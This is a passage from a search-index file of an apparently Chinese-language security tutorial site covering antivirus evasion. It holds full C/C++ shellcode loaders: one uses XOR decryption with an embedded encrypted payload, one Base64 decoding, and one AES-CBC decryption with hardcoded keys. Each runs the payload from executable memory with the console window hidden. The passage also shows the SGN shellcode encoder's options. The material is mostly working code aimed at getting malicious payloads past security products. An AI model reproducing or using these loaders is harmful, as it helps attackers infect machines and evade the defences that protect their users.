f\\xf7\\x7a\\x7b\\x7b\\x90\\xa8\\x92\\x9f\\x7a\\x7b\\x7b\\x93\\xd9\\x84\\x84\\x84\\x54\\x2a\\x01\\x3d\\x37\\x7b\\x47\\x2a\\x8f\\x54\\x2e\\x77\\xf3\\x08\\xa0\\xdc\\xa0\\x3a\\xc1\\x91\\xd3\\xb4\\xe5\\x71\\x92\\x5b\\x79\\x59\\xfa\\x91\\x2a\\xbf\\x0b\\xe0\\xcb\\x33\\xe9\\x98\\xd9\\x9b\\x0b\\x9b\\x40\\x43\\x4a\\x2f\\x0e\\x95\\x18\\xb5\\x1f\\xa8\\xe2\\x72\\x50\\x8f\\x4c\\x36\\xd4\\xd4\\xd9\\xd2\\x45\\xe0\\xfb\\xc8\\x39\\x1b\\x2b\\x43\\xca\\xaa\\x08\\xf5\\xa3\\x12\\x56\\x52\\x13\\x7b\\x2e\\x08\\x1e\\x09\\x56\\x3a\\x1c\\x1e\\x15\\x0f\\x41\\x5b\\x36\\x14\\x01\\x12\\x17\\x17\\x1a\\x54\\x4e\\x55\\x4b\\x5b\\x53\\x18\\x14\\x16\\x0b\\x1a\\x0f\\x12\\x19\\x17\\x1e\\x40\\x5b\\x36\\x28\\x32\\x3e\\x5b\\x42\\x55\\x4b\\x40\\x5b\\x2c\\x12\\x15\\x1f\\x14\\x0c\\x08\\x5b\\x35\\x2f\\x5b\\x4d\\x55\\x4b\\x40\\x5b\\x2f\\x09\\x12\\x1f\\x1e\\x15\\x0f\\x54\\x4e\\x55\\x4b\\x40\\x5b\\x39\\x34\\x32\\x3e\\x42\\x40\\x3e\\x35\\x2e\\x28\\x52\\x76\\x71\\x7b\\x2b\\x6f\\xeb\\x2c\\xfa\\x98\\x46\\xf0\\x0f\\xfc\\x54\\x63\\x78\\x5d\\x28\\xd6\\xc1\\xc1\\x0f\\x65\\x99\\x76\\x16\\x73\\x7d\\x91\\x2a\\x56\\x33\\xd1\\x23\\xc3\\x05\\x14\\x86\\x5e\\xf2\\xd2\\x8a\\xac\\x63\\xd4\\xe0\\x50\\xfe\\xa6\\x92\\x0c\\x4b\\xb3\\xa3\\x6e\\xe2\\x3b\\x1a\\x16\\x30\\x93\\x4f\\x11\\x1a\\x65\\xc3\\x0e\\x28\\x27\\x3c\\xa2\\x89\\xc8\\x88\\xa4\\x63\\x82\\x69\\x62\\xd6\\xe9\\xcb\\x16\\xcb\\xff\\x7b\\x77\\xef\\x27\\x6d\\x19\\xcb\\x4a\\x59\\xe1\\xd5\\x59\\xf9\\x8d\\x63\\xb4\\x58\\xd5\\x9a\\x67\\xf1\\xc2\\x3f\\xd8\\x60\\xcd\\x64\\x47\\x23\\x1f\\xe2\\x6b\\x72\\x7f\\xa7\\x2e\\x6d\\x6f\\x63\\xb3\\x27\\xf1\\x48\\x3d\\x7b\\x70\\x1a\\x30\\xbb\\x42\\xe0\\x21\\x9b\\xd3\\x1a\\xdd\\x45\\xbf\\xb0\\x0c\\xdb\\x5a\\x6e\\xc7\\x9f\\xab\\xcd\\x78\\x9f\\x4d\\x61\\xbf\\x0d\\x7e\\x36\\xc9\\x8f\\x51\\x75\\x21\\xc2\\x9e\\xbf\\x50\\x33\\x6c\\x16\\xfa\\x3f\\x5e\\xe5\\x0d\\x0a\\x1f\\x6c\\xa3\\xe9\\xa7\\x8b\\xe4\\x39\\x4f\\xb2\\x40\\x5c\\x92\\x7a\\xe0\\xff\\x25\\xb5\\x92\\x53\\x23\\x25\\x95\\xe6\\x2b\\x10\\xdf\\xcb\\x46\\x02\\x31\\xd9\\xfa\\x79\\xa6\\xe1\\x99\\x4d\\x7b\\x3a\\xc5\\x8b\\xce\\xd9\\x2d\\x84\\xae\\x33\\x4a\\xb2\\xc1\\x7b\\x7b\\x3b\\x7b\\x3a\\xc3\\x7b\\x6b\\x7b\\x7b\\x3a\\xc2\\x3b\\x7b\\x7b\\x7b\\x3a\\xc1\\x23\\xdf\\x28\\x9e\\x84\\xae\\x33\\xe8\\x28\\x28\\x33\\xf2\\x9c\\x33\\xf2\\x8a\\x33\\xf2\\xa1\\x3a\\xc3\\x7b\\x5b\\x7b\\x7b\\x32\\xf2\\x82\\x3a\\xc1\\x69\\xed\\xf2\\x99\\x84\\xae\\x33\\xf8\\xbf\\x5b\\xfe\\xbb\\x0f\\xcd\\x1d\\xf0\\x7c\\x33\\x7a\\xb8\\xfe\\xbb\\x0e\\xac\\x23\\x23\\x23\\x33\\x7e\\x7b\\x7b\\x7b\\x7b\\x2b\\xb8\\x93\\xe4\\x86\\x84\\x84\\x43\\x55\\x4a\\x48\\x4b\\x55\\x48\\x4e\\x55\\x4a\\x48\\x48\\x7b\\x69\\x4f\\x2d\\x03\"; // \u8fd9\u91cc\u5e94\u8be5\u653e\u5b9e\u9645\u7684\u5f02\u6216\u540e\u7684shellcode\n\nint main() {\n  // \u4f7f\u7528123\u4f5c\u4e3a\u5f02\u6216\u5bc6\u94a5\u8fdb\u884c\u89e3\u5bc6\n  int key = 123;\n  myXor(buf, sizeof(buf), key); // \u5bf9shellcode\u8fdb\u884c\u5f02\u6216\u89e3\u5bc6\n\n  // \u4f7f\u7528VirtualAlloc\u51fd\u6570\u7533\u8bf7\u5185\u5b58\u5757\uff0c\u5927\u5c0f\u4e3a\u89e3\u5bc6\u540e\u7684shellcode\u957f\u5ea6\uff0c\u6743\u9650\u4e3a\u53ef\u8bfb\u3001\u53ef\u5199\u3001\u53ef\u6267\u884c\n  LPVOID addr = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\n  // \u5982\u679c\u5185\u5b58\u7533\u8bf7\u5931\u8d25\uff0c\u7a0b\u5e8f\u9000\u51fa\n  if (addr == NULL) {\n    return 1; // \u8fd4\u56de\u9519\u8bef\u4ee3\u78011\uff0c\u8868\u793a\u5185\u5b58\u5206\u914d\u5931\u8d25\n  }\n\n  // \u5c06\u89e3\u5bc6\u540e\u7684shellcode\u62f7\u8d1d\u5230\u7533\u8bf7\u7684\u5185\u5b58\u5757\u4e2d\n  memcpy(addr, buf, sizeof(buf));\n\n  // \u521b\u5efa\u7ebf\u7a0b\uff0c\u6267\u884c\u89e3\u5bc6\u540e\u7684shellcode\uff0c\u5730\u5740\u4e3a\u7533\u8bf7\u7684\u5185\u5b58\u5757\u5730\u5740\n  HANDLE hThread = CreateThread(\n      NULL,                // \u9ed8\u8ba4\u5b89\u5168\u5c5e\u6027\n      NULL,                // \u9ed8\u8ba4\u5806\u6808\u5927\u5c0f\n      (LPTHREAD_START_ROUTINE)addr, // \u7ebf\u7a0b\u5f00\u59cb\u6267\u884c\u7684\u51fd\u6570\u5730\u5740\uff08\u5373shellcode\u7684\u8d77\u59cb\u5730\u5740\uff09\n      NULL,                // \u4f20\u9012\u7ed9\u7ebf\u7a0b\u7684\u53c2\u6570\n      NULL,                // \u7ebf\u7a0b\u521b\u5efa\u540e\u7acb\u5373\u8fd0\u884c\n      0                    // \u7ebf\u7a0bID\n  );\n\n  // \u7b49\u5f85\u7ebf\u7a0b\u6267\u884c\u5b8c\u6210\n  WaitForSingleObject(hThread, INFINITE); // \u7b49\u5f85\u7ebf\u7a0b\u6267\u884c\u5b8c\u6210\uff0c\u65f6\u95f4\u4e3a\u65e0\u9650\uff08-1\uff09\n\n  // \u5173\u95ed\u7ebf\u7a0b\u53e5\u67c4\n  CloseHandle(hThread);\n\n  return 0; // \u6b63\u5e38\u9000\u51fa\u7a0b\u5e8f\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#4_1","title":"4.\u8fd0\u884c\u540e\u4e0a\u7ebf","text":""},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#2base64","title":"2.base64\u7f16\u7801","text":"<p>\u4f7f\u7528c\u8bed\u8a00\u5b9e\u73b0\u4e00\u4e2a\u4ece16\u8fdb\u5236\u5b57\u7b26\u4e32\u4e2d\u8bfb\u53d6shellcode, \u8fdb\u884cbase64\u7f16\u7801</p> <pre><code>base64.exe p.txt\np.txt\u4e3a16\u8fdb\u5236\u5b57\u7b26\u4e32\u7684shellcode\n</code></pre> <p></p> <p>\u52a0\u8f7d\u5668 c </p> <p>base64.h</p> <pre><code>#ifndef base64_h \n#define base64_h       // \u9632\u6b62\u91cd\u590d\u5305\u542b\u6b64\u5934\u6587\u4ef6\u7684\u5b8f\u5b9a\u4e49\n\n#include &lt;stdio.h&gt;      // \u5f15\u5165\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u5e93\n\n#if __cplusplus \nextern\"C\" {            // \u5982\u679c\u662fC++\u73af\u5883\uff0c\u4f7f\u7528C\u8bed\u8a00\u7684\u94fe\u63a5\u89c4\u8303\n#endif\n\n  int base64_encode(const char* indata, int inlen, char* outdata, int* outlen);  // \u58f0\u660eBase64\u7f16\u7801\u51fd\u6570\n  int base64_decode(const char* indata, int inlen, char* outdata, int* outlen);  // \u58f0\u660eBase64\u89e3\u7801\u51fd\u6570\n\n#if __cplusplus \n}                      // \u7ed3\u675fextern \"C\" \u5757\n#endif\n\n#endif /* base64_h */   // \u7ed3\u675f\u9632\u6b62\u91cd\u590d\u5305\u542b\n</code></pre> <p>base64.c</p> <pre><code>#include \"base64.h\"    // \u5305\u542b\u81ea\u5b9a\u4e49\u7684base64\u5934\u6587\u4ef6\n#include &lt;stdio.h&gt;      // \u5305\u542b\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u5e93\n#include &lt;stdlib.h&gt;     // \u5305\u542b\u6807\u51c6\u5e93\u51fd\u6570\n\n// base64 \u8f6c\u6362\u8868, \u517164\u4e2a\u5b57\u7b26\uff0c\u7528\u4e8e\u7f16\u7801\nstatic const char base64_alphabet[] = {\n    'A', 'B', 'C', 'D', 'E', 'F', 'G',\n    'H', 'I', 'J', 'K', 'L', 'M', 'N',\n    'O', 'P', 'Q', 'R', 'S', 'T',\n    'U', 'V', 'W', 'X', 'Y', 'Z',\n    'a', 'b', 'c', 'd', 'e', 'f', 'g',\n    'h', 'i', 'j', 'k', 'l', 'm', 'n',\n    'o', 'p', 'q', 'r', 's', 't',\n    'u', 'v', 'w', 'x', 'y', 'z',\n    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',\n    '+', '/' };\n\n// \u89e3\u7801\u65f6\u4f7f\u7528\u7684Base64\u5b57\u7b26\u6620\u5c04\u8868\uff0c\u7528\u4e8e\u5c06Base64\u5b57\u7b26\u6620\u5c04\u5230\u76f8\u5e94\u7684\u503c\nstatic const unsigned char base64_suffix_map[256] = {\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 253, 255,\n    255, 253, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 253, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 62, 255, 255, 255, 63,\n    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 255, 255,\n    255, 254, 255, 255, 255, 0, 1, 2, 3, 4, 5, 6,\n    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18,\n    19, 20, 21, 22, 23, 24, 25, 255, 255, 255, 255, 255,\n    255, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,\n    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48,\n    49, 50, 51, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255 };\n\n// \u5c06\u4e00\u4e2a\u5b57\u8282\u7684\u4f4d\u5411\u5de6\u79fb\u548c\u5411\u53f3\u79fb\u64cd\u4f5c\u7684\u8f85\u52a9\u51fd\u6570\nstatic char cmove_bits(unsigned char src, unsigned lnum, unsigned rnum) {\n    src &lt;&lt;= lnum; // \u5411\u5de6\u79fb\u6307\u5b9a\u7684\u4f4d\u6570\n    src &gt;&gt;= rnum; // \u5411\u53f3\u79fb\u6307\u5b9a\u7684\u4f4d\u6570\n    return src;   // \u8fd4\u56de\u7ed3\u679c\n}\n\n// Base64 \u7f16\u7801\u51fd\u6570\nint base64_encode(const char* indata, int inlen, char* outdata, int* outlen) {\n    int ret = 0;  // \u8fd4\u56de\u503c\uff0c\u9ed8\u8ba4\u4e3a0\u8868\u793a\u6210\u529f\n    if (indata == NULL || inlen == 0) {  // \u8f93\u5165\u6570\u636e\u6307\u9488\u4e3a\u7a7a\u6216\u957f\u5ea6\u4e3a0\u65f6\u8fd4\u56de-1\n        return ret = -1;\n    }\n\n    int in_len = 0; // \u8c03\u6574\u540e\u7684\u8f93\u5165\u6570\u636e\u957f\u5ea6\uff0c\u9700\u8981\u662f3\u7684\u500d\u6570\n    int pad_num = 0; // \u9700\u8981\u586b\u5145\u7684\u5b57\u7b26\u6570\n    if (inlen % 3 != 0) {  // \u8f93\u5165\u957f\u5ea6\u4e0d\u662f3\u7684\u500d\u6570\u65f6\u8ba1\u7b97\u586b\u5145\u5b57\u7b26\u6570\n        pad_num = 3 - inlen % 3;\n    }\n    in_len = inlen + pad_num; // \u8c03\u6574\u540e\u7684\u957f\u5ea6\n    int out_len = in_len * 8 / 6; // \u7f16\u7801\u540e\u7684\u8f93\u51fa\u957f\u5ea6\n    char* p = outdata; // \u8f93\u51fa\u6570\u636e\u7684\u6307\u9488\n\n    // \u7f16\u7801\u8fc7\u7a0b\uff0c\u6bcf\u6b21\u5904\u74063\u5b57\u8282\u7684\u6570\u636e\n    for (int i = 0; i &lt; in_len; i += 3) {\n        int value = *indata &gt;&gt; 2; // \u5904\u7406\u7b2c\u4e00\u4e2a\u5b57\u8282\uff0c\u53f3\u79fb2\u4f4d\n        char c = base64_alphabet[value]; // \u83b7\u53d6\u5bf9\u5e94\u7684Base64\u5b57\u7b26\n        *p = c; // \u4fdd\u5b58\u5230\u8f93\u51fa\u6570\u636e\n\n        // \u5904\u7406\u6700\u540e\u4e00\u7ec4\u6570\u636e\u65f6\u7684\u586b\u5145\u5b57\u7b26\n        if (i == inlen + pad_num - 3 &amp;&amp; pad_num != 0) {\n            if (pad_num == 1) {\n                *(p + 1) = base64_alphabet[(int)(cmove_bits(*indata, 6, 2) + cmove_bits(*(indata + 1), 0, 4))];\n                *(p + 2) = base64_alphabet[(int)cmove_bits(*(indata + 1), 4, 2)];\n                *(p + 3) = '='; // \u586b\u5145\u4e00\u4e2a'='\n            } else if (pad_num == 2) { // \u586b\u5145\u4e24\u4e2a'='\n                *(p + 1) = base64_alphabet[(int)cmove_bits(*indata, 6, 2)];\n                *(p + 2) = '=';\n                *(p + 3) = '=';\n            }\n        } else { // \u5904\u7406\u6b63\u5e38\u76843\u5b57\u8282\u6570\u636e\n            *(p + 1) = base64_alphabet[cmove_bits(*indata, 6, 2) + cmove_bits(*(indata + 1), 0, 4)];\n            *(p + 2) = base64_alphabet[cmove_bits(*(indata + 1), 4, 2) + cmove_bits(*(indata + 2), 0, 6)];\n            *(p + 3) = base64_alphabet[*(indata + 2) &amp; 0x3f];\n        }\n        p += 4; // \u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u8f93\u51fa\u4f4d\u7f6e\n        indata += 3; // \u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u8f93\u5165\u4f4d\u7f6e\n    }\n    if (outlen != NULL) { // \u5982\u679c\u8f93\u51fa\u957f\u5ea6\u6307\u9488\u4e0d\u4e3a\u7a7a\uff0c\u4fdd\u5b58\u8f93\u51fa\u957f\u5ea6\n        *outlen = out_len;\n    }\n    return ret; // \u8fd4\u56de\u7ed3\u679c\n}\n\n// Base64 \u89e3\u7801\u51fd\u6570\nint base64_decode(const char* indata, int inlen, char* outdata, int* outlen) {\n    int ret = 0;  // \u8fd4\u56de\u503c\uff0c\u9ed8\u8ba4\u4e3a0\u8868\u793a\u6210\u529f\n    if (indata == NULL || inlen &lt;= 0 || outdata == NULL || outlen == NULL) { // \u68c0\u67e5\u8f93\u5165\u53c2\u6570\u6709\u6548\u6027\n        return ret = -1;\n    }\n    if (inlen % 4 != 0) { // \u8f93\u5165\u6570\u636e\u957f\u5ea6\u4e0d\u662f4\u7684\u500d\u6570\u65f6\u8fd4\u56de-2\n        return ret = -2;\n    }\n    int t = 0, x = 0, y = 0, i = 0; // \u4e34\u65f6\u53d8\u91cf\n    unsigned char c = 0; // \u5f53\u524d\u5b57\u7b26\u7684\u503c\n    int g = 3; // \u586b\u5145\u5b57\u7b26\u6570\u8ba1\u6570\u5668\n    while (indata[x] != 0) { // \u904d\u5386\u8f93\u5165\u6570\u636e\n        c = base64_suffix_map[indata[x++]]; // \u6839\u636e\u8f93\u5165\u5b57\u7b26\u67e5\u627eBase64\u6620\u5c04\u8868\u7684\u503c\n        if (c == 255) return -1; // \u5982\u679c\u503c\u4e0d\u5728\u6620\u5c04\u8868\u4e2d\u8fd4\u56de-1\n        if (c == 253) continue; // \u8df3\u8fc7\u6362\u884c\u7b26\u6216\u56de\u8f66\u7b26\n        if (c == 254) { c = 0; g--; } // \u5bf9\u5e94\u7684\u503c\u662f'='\uff0c\u51cf\u5c11\u586b\u5145\u5b57\u7b26\u6570\n        t = (t &lt;&lt; 6) | c; // \u5c06\u503c\u5408\u5e76\u5230\u4e00\u4e2aint\u53d8\u91cf\u4e2d\n        if (++y == 4) { // \u6bcf\u5904\u74064\u4e2a\u5b57\u7b26\u8f93\u51fa\u89e3\u7801\u540e\u7684\u6570\u636e\n            outdata[i++] = (unsigned char)((t &gt;&gt; 16) &amp; 0xff);\n            if (g &gt; 1) outdata[i++] = (unsigned char)((t &gt;&gt; 8) &amp; 0xff);\n            if (g &gt; 2) outdata[i++] = (unsigned char)(t &amp; 0xff);\n            y = t = 0; // \u91cd\u7f6e\u4e34\u65f6\u53d8\u91cf\n        }\n    }\n    if (outlen != NULL) { // \u5982\u679c\u8f93\u51fa\u957f\u5ea6\u6307\u9488\u4e0d\u4e3a\u7a7a\uff0c\u4fdd\u5b58\u8f93\u51fa\u957f\u5ea6\n        *outlen = i;\n    }\n    return ret; // \u8fd4\u56de\u7ed3\u679c\n}\n</code></pre> <p>\u52a0\u8f7d\u5668 main.c ( \u4f7f\u7528base64\u7f16\u7801 shellcode )</p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#include \"base64.h\"\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\u53e3\nint chartoint(char ch)\n{\n//0xff 0=9 a-f A-F\n//'5' = 65 '0'=60 65-60=5\nif (ch &gt;= '0' &amp;&amp; ch &lt;= '9')\n {\nreturn ch - '0';\n }\nelse if (ch &gt;= 'a' &amp;&amp; ch &lt;= 'f')\n {\nreturn ch - 'a' + 10;\n }\nelse if (ch &gt;= 'A' &amp;&amp; ch &lt;= 'F')\n {\nreturn ch - 'A' + 10;\n }\n}\nint stringtoint(char* string, char* ary)\n{\n//0x01\\0x67\\0xa9\\0x67\\0x66\\0xff\n//0x10==16 0x20==32;16+2\n//10 20 ;10\nint hex = 0;\nfor (size_t i = 0; i &lt; strlen(string); i++)\n {\nif (string[i] == 'x')\n {\nint ff = string[i + 1];\nary[hex] = chartoint(string[i + 1]) * 16 + chartoint(string[i + 2]);\nhex += 1;\ni = i + 2;\n }\n }\nreturn hex;\n}\nint main() {\nchar str2[] = \"XHhmY1x4N\"; // \u6b64\u5904\u653ebase64\u7f16\u7801\u540e\u7684shellcode\nint len = 0;\nchar str3[1000] = { 0 };\nbase64_decode(str2, (int)strlen(str2), str3, &amp;len);\n// \u5b57\u7b26\u4e32\u8f6c\u6210\u5b57\u7b26\u6570\u7ec4,\u786e\u4fdd\u957f\u5ea6\u8db3\u591f\u5927\nchar ary[10000] = { 0 };\nint nlen = strlen(str3) / 5 + 1;\n// \u8f6c\u6362\nint hex = stringtoint(str3, ary); \n// \u4f7f\u7528VirtualAlloc \u51fd\u6570\u7533\u8bf7\u4e00\u4e2a shellcode\u5b57\u8282\u5927\u5c0f\u7684\u53ef\u4ee5\u6267\u884c\u4ee3\u7801\u7684\u5185\u5b58\u5757\nLPVOID addr = VirtualAlloc(NULL, sizeof(ary), MEM_COMMIT | MEM_RESERVE, \nPAGE_EXECUTE_READWRITE);\n// \u7533\u8bf7\u5931\u8d25 , \u9000\u51fa\nif (addr == NULL) {\nreturn 1;\n }\n// \u628ashellcode\u62f7\u8d1d\u5230\u8fd9\u5757\u5185\u5b58\nmemcpy(addr, ary, sizeof(ary));\n// \u521b\u5efa\u7ebf\u7a0b\u8fd0\u884c\nHANDLE hThread = CreateThread(NULL,\nNULL,\n (LPTHREAD_START_ROUTINE)addr,\nNULL,\nNULL,\n0);\n// \u7b49\u5f85\u7ebf\u7a0b\u8fd0\u884c\nWaitForSingleObject(hThread, -1);\n// \u5173\u95ed\u7ebf\u7a0b\nCloseHandle(hThread);\nreturn 0;\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#_5","title":"\u68c0\u9a8c","text":""},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#1base64","title":"1.base64\u7f16\u7801","text":"<pre><code>base64.exe p.txt\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#2_2","title":"2.\u6784\u5efa\u6076\u610f\u6587\u4ef6","text":""},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#3_1","title":"3.\u8fd0\u884c\u4e0a\u7ebf","text":""},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#3aes","title":"3.AES\u52a0\u5bc6","text":"<p>AES\uff08Advanced Encryption Standard\uff09\u662f\u4e00\u79cd\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\uff0c\u88ab\u5e7f\u6cdb\u7528\u4e8e\u4fdd\u62a4\u654f\u611f\u6570\u636e\u7684\u673a\u5bc6\u6027\u3002</p> <p>AES.exe \u5b9e\u73b0\u7684\u52a0\u5bc6\u5668 , p.txt\u662f\u53bb\u6389\\x\u768416\u8fdb\u5236\u5b57\u7b26\u4e32\u6587\u672c, key\u662f16\u5b57\u8282\u957f\u5ea6</p> <pre><code>Aes.exe p.txt fregrgtgrtgh3456\n</code></pre> <p></p> <p>\u52a0\u8f7d\u5668</p> <p>\u4f7f\u7528AES\u6587\u4ef6\u5939\u4e0b\u7684\u6587\u4ef6</p> <p></p> <pre><code>#pragma warning(disable : 4996)\n#include &lt;iostream&gt;\n#include \"AES.h\"\n#include \"Base64.h\"\n#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\nusing namespace std;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\u53e3\nint chartoint(char ch)\n{\n  //0xff 0=9 a-f A-F\n  //'5' = 65 '0'=60 65-60=5\n  if (ch &gt;= '0' &amp;&amp; ch &lt;= '9')\n  {\n    return ch - '0';\n  }\n  else if (ch &gt;= 'a' &amp;&amp; ch &lt;= 'f')\n  {\n    return ch - 'a' + 10;\n  }\n  else if (ch &gt;= 'A' &amp;&amp; ch &lt;= 'F')\n  {\n    return ch - 'A' + 10;\n  }\n}\nvoid stringtoint(char* string, char* ary)\n{\n  int hex = 0;\n  for (size_t i = 0; i &lt; strlen(string); i++)\n  {\n    int ff = string[i];\n    ary[hex] = chartoint(string[i]) * 16 + chartoint(string[i + 1]);\n    hex += 1;\n    i = i + 1;\n  }\n}\nstring DecryptionAES(const string&amp; strSrc, const char* g_key, const char* g_iv)\n{\n  string strData = base64_decode(strSrc);\n  size_t length = strData.length();\n  //\u5bc6\u6587\n  char* szDataIn = new char[length + 1];\n  memcpy(szDataIn, strData.c_str(), length + 1);\n  //\u660e\u6587\n  char* szDataOut = new char[length + 1];\n  memcpy(szDataOut, strData.c_str(), length + 1);\n  //\u8fdb\u884cAES\u7684CBC\u6a21\u5f0f\u89e3\u5bc6\n  AES aes;\n  aes.MakeKey(g_key, g_iv, 16, 16);\n  aes.Decrypt(szDataIn, szDataOut, length, AES::CBC);\n  //\u53bbPKCS7Padding\u586b\u5145\n  if (0x00 &lt; szDataOut[length - 1] &lt;= 0x16)\n  {\n    int tmp = szDataOut[length - 1];\n    for (int i = length - 1; i &gt;= length - tmp; i--)\n    {\n      if (szDataOut[i] != tmp)\n      {\n        memset(szDataOut, 0, length);\n        cout &lt;&lt; \"\u53bb\u586b\u5145\u5931\u8d25\uff01\u89e3\u5bc6\u51fa\u9519\uff01\uff01\" &lt;&lt; endl;\n        break;\n      }\n      else\n        szDataOut[i] = 0;\n    }\n  }\n  string strDest(szDataOut);\n  delete[] szDataIn;\n  delete[] szDataOut;\n  return strDest;\n}\nint main(int argc, char* argv[]) {\n  // \u52a0\u5bc6\u540e\u7684shellcode\n  char str2[] = \"HZesSvGRUWSKDbPvG6sO/h\";\n\n  const char g_key[17] = \"bufreugtrughtuir\";\n  const char g_iv[17] = \"bufreugtrughtuir\";\n  // AES\u89e3\u5bc6\n  string str3 = DecryptionAES(str2, g_key, g_iv);\n  char str4[sizeof(str2)] = { 0 };\n  for (int i = 0; i &lt; str3.length(); i++) {\n    str4[i] = str3[i];\n  }\n  // \u5b57\u7b26\u4e32\u683c\u5f0f\u7684shellcode\u8f6c\u6210\u5b57\u7b26\u6570\u7ec4\n  char ary[sizeof(str4) / 2] = { 0 };\n  stringtoint(str4, ary); // ary\u5b57\u7b26\u6570\u7ec4 , \u539fshellcode\n  // \u4f7f\u7528VirtualAlloc \u51fd\u6570\u7533\u8bf7\u4e00\u4e2a shellcode\u5b57\u8282\u5927\u5c0f\u7684\u53ef\u4ee5\u6267\u884c\u4ee3\u7801\u7684\u5185\u5b58\u5757\n  LPVOID addr = VirtualAlloc(NULL, sizeof(ary), MEM_COMMIT | MEM_RESERVE,\n    PAGE_EXECUTE_READWRITE);\n  // \u7533\u8bf7\u5931\u8d25 , \u9000\u51fa\n  if (addr == NULL) {\n    return 1;\n  }\n  // \u628ashellcode\u62f7\u8d1d\u5230\u8fd9\u5757\u5185\u5b58\n  memcpy(addr, ary, sizeof(ary));\n  // \u521b\u5efa\u7ebf\u7a0b\u8fd0\u884c\n  HANDLE hThread = CreateThread(NULL,\n    NULL,\n    (LPTHREAD_START_ROUTINE)addr,\n    NULL,\n    NULL,\n    0);\n  // \u7b49\u5f85\u7ebf\u7a0b\u8fd0\u884c\n  WaitForSingleObject(hThread, -1);\n  // \u5173\u95ed\u7ebf\u7a0b\n  CloseHandle(hThread);\n  return 0;\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article4/index.html#32shellcode","title":"3.2shellcode\u5185\u5b58\u52a0\u89e3\u5bc6","text":"<p>shellcode\u5185\u5b58\u52a0\u89e3\u5bc6\u76f8\u5bf9\u4e8e\u4e4b\u524d\u7684\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\u8fdb\u884c\u89e3\u5bc6, \u90a3\u4e48\u91ca\u653e\u5230\u5185\u5b58\u4e2d\u7684shellcode\u4f9d\u65e7\u662f\u539f\u59cb\u7684, \u800c\u5728\u5185\u5b58\u7ea7\u522b\u7684\u81ea\u89e3\u5bc6shellcode\u521a\u5f00\u59cb\u5728\u5185\u5b58\u4e2d\u662f\u4e00\u4e32\u4ece\u672a\u89c1\u5230\u8fc7\u7684shellcode\u3002</p> <p>\u547d\u4ee4\u4ecb\u7ecd</p> <pre><code>&gt; sgn.exe -h\n       __   _ __        __                               _\n  ___ / /  (_) /_____ _/ /____ _  ___ ____ _  ___  ___ _(_)\n (_-&lt;/ _ \\/ /  '_/ _ `/ __/ _ `/ / _ `/ _ `/ / _ \\/ _ `/ /\n/___/_//_/_/_/\\_\\\\_,_/\\__/\\_,_/  \\_, /\\_,_/ /_//_/\\_,_/_/\n========[Author:-Ege-Balc\u0131-]====/___/=======v2.0.0=========\n    \u253b\u2501\u253b \ufe35\u30fd(`\u0414\u00b4)\uff89\ufe35 \u253b\u2501\u253b           (\u30ce \u309c\u0414\u309c)\u30ce \ufe35 \u4ed5\u65b9\u304c\u306a\u3044\n\nUsage: sgn.exe [OPTIONS] &lt;FILE&gt;\n  -a int\n        Binary architecture (32/64) (default 32)\n  -asci\n        Generates a full ASCI printable payload (takes very long time to bruteforce)\n  -badchars string\n        Don't use specified bad characters given in hex format (\\x00\\x01\\x02...)\n  -c int\n        Number of times to encode the binary (increases overall size) (default 1)\n  -h    Print help\n  -max int\n        Maximum number of bytes for obfuscation (default 20)\n  -o string\n        Encoded output binary name\n  -plain-decoder\n        Do not encode the decoder stub\n  -safe\n        Do not modify any register values\n  -v    More verbose output\n</code></pre> <p>-a\uff1a\u6307\u5b9a\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u67b6\u6784\uff0832\u4f4d\u621664\u4f4d\uff09\u3002 -asci\uff1a\u751f\u6210\u5b8c\u6574\u7684ASCII\u53ef\u6253\u5370\u6709\u6548\u8d1f\u8f7d\uff0c\u4f46\u9700\u8981\u5f88\u957f\u65f6\u95f4\u8fdb\u884c\u66b4\u529b\u7834\u89e3\u3002 